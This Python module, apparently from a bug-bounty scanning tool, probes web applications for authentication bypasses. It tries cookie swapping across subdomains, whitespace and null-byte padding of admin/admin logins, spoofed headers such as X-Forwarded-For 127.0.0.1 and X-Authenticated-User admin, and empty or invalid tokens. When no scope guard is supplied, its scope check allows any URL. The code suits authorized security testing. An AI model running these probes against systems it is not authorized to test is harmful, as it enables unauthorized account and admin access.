"""
Session & Auth Bypass — Cookie swapping, whitespace bypass, session fixation.

Inspired by the $40K writeup where:
1. PHPSESSID from extranet worked on intranet (cookie swap bypass)
2. %20 trailing space bypassed SSO completely
3. Session fixation allowed privilege escalation

These are the tests most hunters miss.

SCOPE SAFETY: Every URL is validated against scope before any request.
"""

import re
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs
from tools import ToolExecutor


class SessionAuthBypass:
    """
    Session and authentication bypass testing.

    Key techniques:
    1. Cookie swapping between subdomains/portals
    2. Whitespace/encoded space bypass
    3. Session fixation
    4. Header-based auth bypass
    5. Token manipulation
    """

    def __init__(self, tools: ToolExecutor = None, scope_guard=None):
        self.tools = tools or ToolExecutor()
        self.scope_guard = scope_guard

    def _is_in_scope(self, url: str) -> bool:
        """Check if URL is within authorized scope."""
        if not self.scope_guard:
            return True
        from .scope_guard import OPSECLevel
        validation = self.scope_guard.validate_target(url, OPSECLevel.MODERATE)
        return validation.in_scope

    # ─── Cookie Names to Test ────────────────────────────────────

    SESSION_COOKIES = [
        "PHPSESSID", "JSESSIONID", "ASP.NET_SessionId", "sid",
        "session", "sess", "token", "auth", "session_id",
        "connect.sid", "_session_id", "rails_session",
    ]

    # ─── Auth Headers to Test ────────────────────────────────────

    AUTH_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
        {"X-Forwarded-Host": "127.0.0.1"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Remote-Addr": "127.0.0.1"},
        {"X-Admin": "true"},
        {"X-Debug": "true"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"Forwarded": "for=127.0.0.1;by=127.0.0.1;host=127.0.0.1"},
        {"X-Host": "127.0.0.1"},
        {"X-ProxyUser": "admin"},
        {"X-Authenticated-User": "admin"},
    ]

    # ─── Whitespace Variants ─────────────────────────────────────

    WHITESPACE_VARIANTS = [
        "%20",      # URL encoded space
        "%09",      # Tab
        "%0A",      # Newline
        "%0D",      # Carriage return
        "%0D%0A",   # CRLF
        "%00",      # Null byte
        "\t",       # Tab
        "\n",       # Newline
        "\r",       # Carriage return
        " ",        # Literal space
    ]

    # ─── Test Session Swap ───────────────────────────────────────

    async def test_session_swap(
        self,
        extranet_url: str,
        intranet_url: str,
        extranet_cookies: dict = None,
    ) -> list:
        """
        Test if session cookies from one portal work on another.

        This is the exact technique from the $40K writeup:
        - Login to extranet, get PHPSESSID
        - Try that PHPSESSID on intranet
        - If intranet loads, it's a cookie swap vulnerability
        """
        findings = []

        # Scope check
        if not self._is_in_scope(intranet_url):
            return findings

        # First, get a session from the extranet
        if not extranet_cookies:
            extranet_cookies = await self._get_session_cookies(extranet_url)

        if not extranet_cookies:
            return findings

        # Try each session cookie on the intranet
        for cookie_name, cookie_value in extranet_cookies.items():
            if cookie_name in self.SESSION_COOKIES:
                # Test on intranet
                result = await self._test_cookie_on_target(
                    intranet_url, cookie_name, cookie_value
                )

                if result["status"] == 200 and result["size"] > 500:
                    findings.append({
                        "type": "Session Swap",
                        "url": intranet_url,
                        "cookie": f"{cookie_name}={cookie_value[:20]}...",
                        "severity": "critical",
                        "evidence": f"Session cookie from extranet worked on intranet (200, {result['size']} bytes)",
                        "description": f"Cookie swap bypass — {cookie_name} from extranet grants access to intranet",
                        "confidence": 0.95,
                        "cvss_score": 8.8,
                        "source_tool": "session-swap",
                    })

                # Also test on other subdomains
                parsed = urlparse(intranet_url)
                base_domain = ".".join(parsed.netloc.split(".")[-2:])

                for subdomain in ["admin", "portal", "api", "internal", "staging", "dev"]:
                    test_url = f"{parsed.scheme}://{subdomain}.{base_domain}"
                    result = await self._test_cookie_on_target(
                        test_url, cookie_name, cookie_value
                    )

                    if result["status"] == 200 and result["size"] > 200:
                        findings.append({
                            "type": "Session Swap",
                            "url": test_url,
                            "cookie": f"{cookie_name}",
                            "severity": "critical",
                            "evidence": f"Session cookie worked on {subdomain}.{base_domain}",
                            "description": f"Cookie swap — {cookie_name} grants access to {subdomain} subdomain",
                            "confidence": 0.85,
                            "cvss_score": 8.5,
                            "source_tool": "session-swap",
                        })

        return findings

    # ─── Whitespace Auth Bypass ──────────────────────────────────

    async def test_whitespace_bypass(
        self,
        login_url: str,
        username: str = "admin",
        password: str = "admin",
    ) -> list:
        """
        Test if whitespace bypasses SSO/authentication.

        From the writeup: %20 (trailing space) bypassed SSO completely
        and fell back to the legacy login flow.
        """
        findings = []

        # Scope check
        if not self._is_in_scope(login_url):
            return findings

        # Test username with trailing whitespace
        for ws in self.WHITESPACE_VARIANTS:
            test_username = f"{username}{ws}"

            result = await self._test_login(
                login_url, test_username, password
            )

            if result["status"] in (200, 302) and result["size"] > 500:
                # Check if we got past SSO
                body_lower = result.get("body", "").lower()
                if any(indicator in body_lower for indicator in (
                    "dashboard", "welcome", "profile", "logout", "admin",
                    "success", "authenticated",
                )):
                    findings.append({
                        "type": "Whitespace Auth Bypass",
                        "url": login_url,
                        "payload": f"username={test_username}",
                        "severity": "critical",
                        "evidence": f"Trailing whitespace bypassed SSO (status {result['status']})",
                        "description": f"Whitespace bypass: '{ws}' in username bypassed SSO authentication",
                        "confidence": 0.9,
                        "cvss_score": 9.1,
                        "source_tool": "whitespace-bypass",
                    })
                    break

        # Test password with trailing whitespace
        for ws in self.WHITESPACE_VARIANTS[:3]:
            test_password = f"{password}{ws}"

            result = await self._test_login(
                login_url, username, test_password
            )

            if result["status"] in (200, 302) and result["size"] > 500:
                body_lower = result.get("body", "").lower()
                if any(indicator in body_lower for indicator in (
                    "dashboard", "welcome", "profile", "admin", "success",
                )):
                    findings.append({
                        "type": "Whitespace Auth Bypass",
                        "url": login_url,
                        "payload": f"password={test_password}",
                        "severity": "critical",
                        "evidence": f"Trailing whitespace in password bypassed SSO",
                        "description": f"Whitespace bypass: '{ws}' in password bypassed SSO",
                        "confidence": 0.85,
                        "cvss_score": 9.1,
                        "source_tool": "whitespace-bypass",
                    })
                    break

        # Test with whitespace in both
        for ws in self.WHITESPACE_VARIANTS[:3]:
            result = await self._test_login(
                login_url, f"{username}{ws}", f"{password}{ws}"
            )

            if result["status"] in (200, 302) and result["size"] > 500:
                body_lower = result.get("body", "").lower()
                if any(indicator in body_lower for indicator in (
                    "dashboard", "welcome", "admin", "success",
                )):
                    findings.append({
                        "type": "Whitespace Auth Bypass",
                        "url": login_url,
                        "severity": "critical",
                        "evidence": f"Whitespace in both fields bypassed SSO",
                        "description": "Whitespace bypass in username AND password",
                        "confidence": 0.85,
                        "cvss_score": 9.1,
                        "source_tool": "whitespace-bypass",
                    })
                    break

        return findings

    # ─── Header-Based Auth Bypass ────────────────────────────────

    async def test_header_bypass(
        self,
        url: str,
        session_cookie: str = None,
    ) -> list:
        """
        Test header-based authentication bypass techniques.
        """
        findings = []

        # Scope check
        if not self._is_in_scope(url):
            return findings

        for header in self.AUTH_HEADERS:
            headers = dict(header)
            if session_cookie:
                headers["Cookie"] = session_cookie

            result = await self._make_request(url, headers=headers)

            if result["status"] == 200 and result["size"] > 500:
                body_lower = result.get("body", "").lower()
                if any(indicator in body_lower for indicator in (
                    "dashboard", "admin", "settings", "users", "manage",
                )):
                    findings.append({
                        "type": "Header Auth Bypass",
                        "url": url,
                        "header": str(header),
                        "severity": "critical",
                        "evidence": f"Header bypass returned admin content (200, {result['size']} bytes)",
                        "description": f"Auth bypass via {list(header.keys())[0]} header",
                        "confidence": 0.8,
                        "cvss_score": 8.8,
                        "source_tool": "header-bypass",
                    })

        return findings

    # ─── Token Manipulation ──────────────────────────────────────

    async def test_token_manipulation(
        self,
        url: str,
        token: str,
        token_type: str = "Bearer",
    ) -> list:
        """
        Test JWT/token manipulation techniques.
        """
        findings = []

        # Scope check
        if not self._is_in_scope(url):
            return findings

        # Test with empty token
        result = await self._make_request(
            url, headers={"Authorization": f"{token_type} "}
        )
        if result["status"] == 200:
            findings.append({
                "type": "Token Bypass",
                "url": url,
                "severity": "high",
                "evidence": "Empty token accepted",
                "description": "Authentication bypass with empty token",
                "confidence": 0.7,
                "cvss_score": 7.5,
                "source_tool": "token-bypass",
            })

        # Test with invalid token
        result = await self._make_request(
            url, headers={"Authorization": f"{token_type} invalid123"}
        )
        if result["status"] == 200:
            findings.append({
                "type": "Token Bypass",
                "url": url,
                "severity": "high",
                "evidence": "Invalid token accepted",
                "description": "Server accepts invalid tokens",
                "confidence": 0.6,
                "cvss_score": 7.5,
                "source_tool": "token-bypass",
            })

        return findings

    # ─── Helpers ─────────────────────────────────────────────────

    async def _get_session_cookies(self, url: str) -> dict:
        """Get session cookies from a URL by making a request."""
        result = await self._make_request(url)
        cookies = {}

        # Parse Set-Cookie headers from raw response
        raw = result.get("raw", "")
        for match in re.finditer(r"Set-Cookie:\s*([^=]+)=([^;]+)", raw, re.IGNORECASE):
            name = match.group(1).strip()
            value = match.group(2).strip()
            if name in self.SESSION_COOKIES:
                cookies[name] = value

        return cookies

    async def _test_cookie_on_target(
        self,
        url: str,
        cookie_name: str,
        cookie_value: str,
    ) -> dict:
        """Test if a specific cookie works on a target URL."""
        result = await self._make_request(
            url, headers={"Cookie": f"{cookie_name}={cookie_value}"}
        )
        return result

    async def _test_login(
        self,
        url: str,
        username: str,
        password: str,
    ) -> dict:
        """Test a login attempt."""
        import json
        data = json.dumps({"username": username, "password": password})
        result = await self._make_request(
            url, method="POST", data=data,
            headers={"Content-Type": "application/json"}
        )
        return result

    async def _make_request(
        self,
        url: str,
        method: str = "GET",
        headers: dict = None,
        data: str = None,
        timeout: int = 10,
    ) -> dict:
        cmd = ["curl", "-s", "-L", "-i", "--max-time", str(timeout)]

        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        if method == "POST":
            cmd.extend(["-X", "POST"])
            if data:
                cmd.extend(["--data", data])

        cmd.append(url)

        result = await self.tools.run("curl", cmd[1:])
        return self._parse_response(result.get("stdout", ""))

    def _parse_response(self, raw: str) -> dict:
        parts = raw.split("\r\n\r\n", 1)
        headers_raw = parts[0] if parts else ""
        body = parts[1] if len(parts) > 1 else ""

        status_match = re.search(r"HTTP/\d\.\d\s+(\d+)", headers_raw)
        status = int(status_match.group(1)) if status_match else 0

        headers = {}
        for line in headers_raw.split("\n")[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        return {
            "status": status,
            "headers": headers,
            "body": body[:5000],
            "size": len(body),
        }
